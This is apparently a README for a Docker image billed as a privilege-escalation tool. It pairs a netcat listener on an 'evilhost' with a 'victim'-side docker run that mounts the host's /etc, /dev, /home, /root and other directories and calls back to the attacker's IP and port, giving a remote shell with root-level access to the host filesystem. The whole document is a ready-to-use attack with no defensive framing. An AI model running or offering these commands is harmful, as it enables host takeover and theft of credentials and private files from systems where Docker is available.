Docker image for privilege escalation.

On _evilhost_ side:

```
netcat -l -p evilhost_port
```

On _victim_ side:

```
docker run --rm -v /etc/:/etc \
                -v /dev:/dev \
                -v /mnt:/mnt \
                -v /opt:/opt \
                -v /home:/home \
                -v /root:/root \
                vulnbe/netcat evilhost_ip evilhost_port
```
